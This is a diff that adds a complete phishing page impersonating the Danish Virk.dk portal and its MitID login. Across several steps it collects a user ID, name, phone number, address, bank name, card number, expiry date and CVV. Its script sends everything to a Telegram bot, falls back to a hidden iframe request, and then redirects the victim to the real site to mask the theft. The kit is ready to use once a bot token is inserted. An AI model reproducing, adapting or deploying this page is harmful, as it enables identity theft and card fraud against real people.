@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virk.dk – Log ind</title>
+    <!-- Google Fonts for a clean look -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --virk-red: #C60C30;
+            --virk-dark: #1A1A1A;
+            --virk-gray: #F5F5F5;
+            --virk-border: #D0D0D0;
+            --virk-text: #333333;
+            --virk-white: #FFFFFF;
+            --virk-blue: #0B5FA5; /* MitID blue accent */
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: var(--virk-gray);
+            color: var(--virk-text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.3s ease;
+        }
+        .container {
+            background: var(--virk-white);
+            width: 100%;
+            max-width: 480px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            padding: 2.5rem 2rem;
+            margin: 1rem;
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.5s ease;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        .logo img {
+            max-width: 180px;
+            height: auto;
+        }
+        .logo h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--virk-red);
+            letter-spacing: -1px;
+            display: inline;
+        }
+        .logo span {
+            font-size: 1.2rem;
+            color: var(--virk-dark);
+            font-weight: 400;
+        }
+        .step {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        .step.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        h2 {
+            font-weight: 500;
+            font-size: 1.6rem;
+            color: var(--virk-dark);
+            margin-bottom: 0.5rem;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 1.5rem;
+            font-size: 0.95rem;
+        }
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 12px 20px;
+            background: var(--virk-red);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .btn:hover {
+            background: #A50A28;
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .btn-secondary {
+            background: #fff;
+            color: var(--virk-red);
+            border: 2px solid var(--virk-red);
+        }
+        .btn-secondary:hover {
+            background: #fce8ec;
+        }
+        input[type="text"],
+        input[type="tel"],
+        input[type="password"],
+        input[type="number"],
+        input[type="date"],
+        input[type="month"] {
+            width: 100%;
+            padding: 12px 14px;
+            margin: 8px 0 16px;
+            border: 1px solid var(--virk-border);
+            border-radius: 6px;
+            font-size: 1rem;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            outline: none;
+        }
+        input:focus {
+            border-color: var(--virk-red);
+            box-shadow: 0 0 0 3px rgba(198, 12, 48, 0.1);
+        }
+        label {
+            font-weight: 500;
+            color: var(--virk-dark);
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group {
+            margin-bottom: 1rem;
+        }
+        .card-row {
+            display: flex;
+            gap: 10px;
+        }
+        .card-row .input-group {
+            flex: 1;
+        }
+        .error {
+            color: var(--virk-red);
+            font-size: 0.85rem;
+            margin-top: -10px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .success-msg {
+            text-align: center;
+            padding: 2rem;
+            display: none;
+        }
+        .success-msg i {
+            font-size: 4rem;
+            color: #4CAF50;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.8rem;
+            color: #999;
+        }
+        .mitid-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 15px 0;
+            color: var(--virk-blue);
+            font-weight: 500;
+        }
+        .mitid-badge::before {
+            content: "✔";
+            color: var(--virk-blue);
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.5rem 1.2rem;
+                margin: 0.5rem;
+                border-radius: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="app">
+        <!-- Step 1: Landing / Login button -->
+        <div class="step active" id="step1">
+            <div class="logo">
+                <!-- Virk logo text-based (replace with actual image if available) -->
+                <h1>virk<span>.dk</span></h1>
+                <p style="color:#666; margin-top: 5px;">Digital selvbetjening for virksomheder</p>
+            </div>
+            <h2>Log ind på Virk</h2>
+            <p class="subtitle">Brug dit MitID for at få adgang til dine virksomhedsoplysninger.</p>
+            <div class="mitid-badge">MitID</div>
+            <button class="btn" id="toStep2">Log ind med MitID</button>
+            <p style="text-align:center; margin-top:15px; font-size:0.85rem; color:#666;">
+                Har du ikke MitID? <a href="#" style="color:var(--virk-red); text-decoration:none;">Læs mere her</a>
+            </p>
+        </div>
+
+        <!-- Step 2: Bruger ID (like MitID username) -->
+        <div class="step" id="step2">
+            <div class="logo">
+                <h1>virk<span>.dk</span></h1>
+            </div>
+            <h2>Bruger ID</h2>
+            <p class="subtitle">Indtast dit bruger ID for at fortsætte.</p>
+            <div class="input-group">
+                <label for="brugerId">Bruger ID</label>
+                <input type="text" id="brugerId" placeholder="F.eks. CPR-nummer eller brugernavn" autocomplete="off">
+                <div class="error" id="errorBrugerId">Indtast venligst dit bruger ID.</div>
+            </div>
+            <button class="btn" id="toStep3">Fortsæt</button>
+            <button class="btn btn-secondary" style="margin-top:8px;" id="backToStep1">← Tilbage</button>
+        </div>
+
+        <!-- Step 3: Personal information -->
+        <div class="step" id="step3">
+            <div class="logo">
+                <h1>virk<span>.dk</span></h1>
+            </div>
+            <h2>Personlige oplysninger</h2>
+            <p class="subtitle">Udfyld venligst dine oplysninger for at bekræfte din identitet.</p>
+            <div class="input-group">
+                <label for="navn">Fulde navn</label>
+                <input type="text" id="navn" placeholder="F.eks. Anders Andersen">
+                <div class="error" id="errorNavn">Indtast dit fulde navn.</div>
+            </div>
+            <div class="input-group">
+                <label for="telefon">Telefonnummer</label>
+                <input type="tel" id="telefon" placeholder="F.eks. 12 34 56 78">
+                <div class="error" id="errorTelefon">Indtast et gyldigt telefonnummer.</div>
+            </div>
+            <div class="input-group">
+                <label for="adresse">Adresse</label>
+                <input type="text" id="adresse" placeholder="Vejnavn, husnummer, postnummer, by">
+                <div class="error" id="errorAdresse">Indtast din adresse.</div>
+            </div>
+            <div class="input-group">
+                <label for="bank">Bank navn</label>
+                <input type="text" id="bank" placeholder="F.eks. Danske Bank">
+                <div class="error" id="errorBank">Indtast din banks navn.</div>
+            </div>
+            <button class="btn" id="toStep4">Fortsæt</button>
+            <button class="btn btn-secondary" style="margin-top:8px;" id="backToStep2">← Tilbage</button>
+        </div>
+
+        <!-- Step 4: Card information -->
+        <div class="step" id="step4">
+            <div class="logo">
+                <h1>virk<span>.dk</span></h1>
+            </div>
+            <h2>Betalingsoplysninger</h2>
+            <p class="subtitle">Indtast dine kortoplysninger for at bekræfte betaling.</p>
+            <div class="input-group">
+                <label for="kortnummer">Kortnummer</label>
+                <input type="text" id="kortnummer" placeholder="1234 5678 9012 3456" inputmode="numeric" maxlength="19">
+                <div class="error" id="errorKortnummer">Indtast et gyldigt kortnummer.</div>
+            </div>
+            <div class="card-row">
+                <div class="input-group">
+                    <label for="udlobsdato">Udløbsdato</label>
+                    <input type="text" id="udlobsdato" placeholder="MM/ÅÅ" inputmode="numeric" maxlength="5">
+                    <div class="error" id="errorUdlobsdato">Indtast udløbsdato.</div>
+                </div>
+                <div class="input-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123" inputmode="numeric" maxlength="4">
+                    <div class="error" id="errorCvv">Indtast CVV.</div>
+                </div>
+            </div>
+            <button class="btn" id="submitBtn">
+                <span id="btnText">Bekræft og send</span>
+            </button>
+            <button class="btn btn-secondary" style="margin-top:8px;" id="backToStep3">← Tilbage</button>
+        </div>
+
+        <!-- Success message -->
+        <div class="success-msg" id="successMsg">
+            <i>✅</i>
+            <h2 style="margin-top:15px;">Tak! Din information er blevet bekræftet.</h2>
+            <p>Du vil blive viderestillet til Virk.dk om et øjeblik...</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        Virk.dk – officiel digital selvbetjening for danske virksomheder
+    </div>
+
+    <script>
+        (function() {
+            // ==================== CONFIGURATION ====================
+            // Replace these with your Telegram bot token and chat ID
+            const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+            const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+            // ========================================================
+
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const step4 = document.getElementById('step4');
+            const successMsg = document.getElementById('successMsg');
+
+            function showStep(step) {
+                [step1, step2, step3, step4, successMsg].forEach(s => s.classList.remove('active'));
+                step.classList.add('active');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+
+            // Navigation buttons
+            document.getElementById('toStep2').addEventListener('click', () => showStep(step2));
+            document.getElementById('backToStep1').addEventListener('click', () => showStep(step1));
+            document.getElementById('toStep3').addEventListener('click', () => {
+                const brugerId = document.getElementById('brugerId').value.trim();
+                if (brugerId === '') {
+                    document.getElementById('errorBrugerId').style.display = 'block';
+                    return;
+                }
+                document.getElementById('errorBrugerId').style.display = 'none';
+                showStep(step3);
+            });
+            document.getElementById('backToStep2').addEventListener('click', () => showStep(step2));
+            document.getElementById('toStep4').addEventListener('click', () => {
+                const navn = document.getElementById('navn').value.trim();
+                const telefon = document.getElementById('telefon').value.trim();
+                const adresse = document.getElementById('adresse').value.trim();
+                const bank = document.getElementById('bank').value.trim();
+                let valid = true;
+                if (navn === '') { document.getElementById('errorNavn').style.display = 'block'; valid = false; } else { document.getElementById('errorNavn').style.display = 'none'; }
+                if (telefon === '' || !/^[0-9+\s]{8,}$/.test(telefon)) { document.getElementById('errorTelefon').style.display = 'block'; valid = false; } else { document.getElementById('errorTelefon').style.display = 'none'; }
+                if (adresse === '') { document.getElementById('errorAdresse').style.display = 'block'; valid = false; } else { document.getElementById('errorAdresse').style.display = 'none'; }
+                if (bank === '') { document.getElementById('errorBank').style.display = 'block'; valid = false; } else { document.getElementById('errorBank').style.display = 'none'; }
+                if (valid) showStep(step4);
+            });
+            document.getElementById('backToStep3').addEventListener('click', () => showStep(step3));
+
+            // Submit handler
+            document.getElementById('submitBtn').addEventListener('click', async function(e) {
+                e.preventDefault();
+                const btn = this;
+                const btnText = document.getElementById('btnText');
+
+                // Validate card fields
+                const kortnummer = document.getElementById('kortnummer').value.trim();
+                const udlobsdato = document.getElementById('udlobsdato').value.trim();
+                const cvv = document.getElementById('cvv').value.trim();
+                let valid = true;
+                if (kortnummer === '' || kortnummer.replace(/\s/g, '').length < 12) {
+                    document.getElementById('errorKortnummer').style.display = 'block';
+                    valid = false;
+                } else { document.getElementById('errorKortnummer').style.display = 'none'; }
+                if (udlobsdato === '' || !/^\d{2}\/\d{2}$/.test(udlobsdato)) {
+                    document.getElementById('errorUdlobsdato').style.display = 'block';
+                    valid = false;
+                } else { document.getElementById('errorUdlobsdato').style.display = 'none'; }
+                if (cvv === '' || cvv.length < 3) {
+                    document.getElementById('errorCvv').style.display = 'block';
+                    valid = false;
+                } else { document.getElementById('errorCvv').style.display = 'none'; }
+                if (!valid) return;
+
+                // Disable button and show spinner
+                btn.disabled = true;
+                btnText.innerHTML = '<span class="spinner"></span>Sender...';
+
+                // Gather all data
+                const data = {
+                    brugerId: document.getElementById('brugerId').value.trim(),
+                    navn: document.getElementById('navn').value.trim(),
+                    telefon: document.getElementById('telefon').value.trim(),
+                    adresse: document.getElementById('adresse').value.trim(),
+                    bank: document.getElementById('bank').value.trim(),
+                    kortnummer: kortnummer,
+                    udlobsdato: udlobsdato,
+                    cvv: cvv
+                };
+
+                const message = `🔴 *NYT LOGIN FRA VIRK.DK*\n\n` +
+                    `👤 *Bruger ID:* ${data.brugerId}\n` +
+                    `📛 *Navn:* ${data.navn}\n` +
+                    `📞 *Telefon:* ${data.telefon}\n` +
+                    `🏠 *Adresse:* ${data.adresse}\n` +
+                    `🏦 *Bank:* ${data.bank}\n` +
+                    `💳 *Kortnummer:* ${data.kortnummer}\n` +
+                    `📅 *Udløbsdato:* ${data.udlobsdato}\n` +
+                    `🔒 *CVV:* ${data.cvv}\n\n` +
+                    `⏰ *Tid:* ${new Date().toLocaleString('da-DK')}`;
+
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+                try {
+                    // Try fetch POST with JSON
+                    const response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    if (!response.ok) {
+                        // Fallback to GET with URL params (older clients)
+                        const getUrl = `${telegramUrl}?chat_id=${encodeURIComponent(TELEGRAM_CHAT_ID)}&text=${encodeURIComponent(message)}`;
+                        await fetch(getUrl, { mode: 'no-cors' });
+                    }
+                } catch (error) {
+                    // Fallback: open a hidden iframe with GET request
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = `${telegramUrl}?chat_id=${encodeURIComponent(TELEGRAM_CHAT_ID)}&text=${encodeURIComponent(message)}`;
+                    document.body.appendChild(iframe);
+                }
+
+                // Show success
+                showStep(successMsg);
+                setTimeout(() => {
+                    window.location.href = 'https://virk.dk';
+                }, 3000);
+            });
+
+            // Formatting helpers (optional)
+            document.getElementById('kortnummer').addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+            });
+            document.getElementById('udlobsdato').addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/, '$1/');
+            });
+            document.getElementById('cvv').addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+            });
+        })();
+    </script>
+</body>
+</html>
